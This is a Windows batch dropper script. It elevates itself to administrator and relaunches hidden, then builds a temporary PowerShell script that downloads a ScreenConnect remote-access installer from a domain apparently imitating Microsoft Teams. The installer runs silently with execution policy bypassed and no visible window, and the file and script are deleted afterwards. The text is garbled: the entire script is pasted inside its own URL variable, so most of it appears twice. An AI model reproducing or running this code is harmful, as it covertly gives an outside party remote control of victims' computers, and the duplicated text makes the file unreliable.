@echo off
setlocal EnableDelayedExpansion

:: =========================================================
:: 1. AUTO-ELEVATE TO ADMIN (UAC PROMPT)
:: =========================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Relaunch this BAT as admin without any window
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: =========================================================
:: 2. CREATE TEMP POWERSHELL SCRIPT (your working logic)
:: =========================================================
set "PS1=%TEMP%\sc_hidden_install.ps1"

> "%PS1%" echo $msiUrl = "@echo off
setlocal EnableDelayedExpansion

:: =========================================================
:: 1. AUTO-ELEVATE TO ADMIN (UAC PROMPT)
:: =========================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Relaunch this BAT as admin without any window
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: =========================================================
:: 2. CREATE TEMP POWERSHELL SCRIPT (your working logic)
:: =========================================================
set "PS1=%TEMP%\sc_hidden_install.ps1"

> "%PS1%" echo $msiUrl = "https://link-teams.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
>>"%PS1%" echo $downloadPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"
>>"%PS1%" echo $logPath = "$env:TEMP\SC_install_log.txt"

>>"%PS1%" echo try {
>>"%PS1%" echo     Invoke-WebRequest -Uri $msiUrl -OutFile $downloadPath -ErrorAction Stop
>>"%PS1%" echo } catch {
>>"%PS1%" echo     exit 1
>>"%PS1%" echo }

>>"%PS1%" echo $arguments = "/i `"$downloadPath`" /quiet /norestart /L*v `"$logPath`""

>>"%PS1%" echo try {
>>"%PS1%" echo     $process = Start-Process msiexec.exe -ArgumentList $arguments -Wait -PassThru -ErrorAction Stop
>>"%PS1%" echo } catch {
>>"%PS1%" echo     exit 2
>>"%PS1%" echo }

>>"%PS1%" echo if (Test-Path $downloadPath) { Remove-Item $downloadPath -Force }

>>"%PS1%" echo exit $process.ExitCode

:: =========================================================
:: 3. RUN POWERSHELL HIDDEN (NO WINDOW)
:: =========================================================
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"

:: Optional: clean up the temp PS1
del "%PS1%" >nul 2>&1

endlocal
exit /b
"
>>"%PS1%" echo $downloadPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"
>>"%PS1%" echo $logPath = "$env:TEMP\SC_install_log.txt"

>>"%PS1%" echo try {
>>"%PS1%" echo     Invoke-WebRequest -Uri $msiUrl -OutFile $downloadPath -ErrorAction Stop
>>"%PS1%" echo } catch {
>>"%PS1%" echo     exit 1
>>"%PS1%" echo }

>>"%PS1%" echo $arguments = "/i `"$downloadPath`" /quiet /norestart /L*v `"$logPath`""

>>"%PS1%" echo try {
>>"%PS1%" echo     $process = Start-Process msiexec.exe -ArgumentList $arguments -Wait -PassThru -ErrorAction Stop
>>"%PS1%" echo } catch {
>>"%PS1%" echo     exit 2
>>"%PS1%" echo }

>>"%PS1%" echo if (Test-Path $downloadPath) { Remove-Item $downloadPath -Force }

>>"%PS1%" echo exit $process.ExitCode

:: =========================================================
:: 3. RUN POWERSHELL HIDDEN (NO WINDOW)
:: =========================================================
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"

:: Optional: clean up the temp PS1
del "%PS1%" >nul 2>&1

endlocal
exit /b
